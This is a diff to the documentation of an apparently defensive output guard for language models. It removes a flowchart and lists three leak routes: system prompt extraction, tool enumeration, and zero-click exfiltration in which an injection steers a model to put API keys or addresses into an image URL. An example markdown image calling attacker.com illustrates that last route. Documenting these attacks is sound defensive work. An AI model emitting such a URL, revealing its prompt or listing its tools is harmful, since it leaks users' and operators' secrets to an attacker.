@@ -17,24 +17,6 @@ Theorem reads what the model writes at the outbound boundaries (`reply`, `reply_
 
 Model output has three main ways to leak:
 
-```mermaid
-flowchart TD
-		subgraph ModelOutput ["What the model writes"]
-				DirectLeak["1. System prompt leak"]
-				ImageExfil["2. Image or link to an address it was not given"]
-				ToolEnum["3. Tool and parameter names"]
-		end
-
-		DirectLeak --> OutboundGate{"Outbound boundary"}
-		ImageExfil --> OutboundGate
-		ToolEnum --> OutboundGate
-
-		OutboundGate -->|canary_leak / prompt_leak| Act1["Flag, redact or block"]
-		OutboundGate -->|ungiven_images / ungiven_links| Act2["Flag, redact or block"]
-		OutboundGate -->|tool_leak| Act3["Flag, redact or block"]
-		OutboundGate -->|No match| User["Delivered"]
-```
-
 1. **System Prompt Extraction**: A user asks the model to repeat its hidden instructions, persona rules, or business logic.
 2. **Zero-Click Markdown Exfiltration**: An injection steers the model to put data (such as API keys or user addresses) into an image URL: `![preview](https://attacker.com/leak?data=...)`. When the user's browser renders the image, it requests the URL, and the data leaves without a click.
 3. **Tool Enumeration**: The model names its tools or their parameters, which tells an attacker how the agent is built.
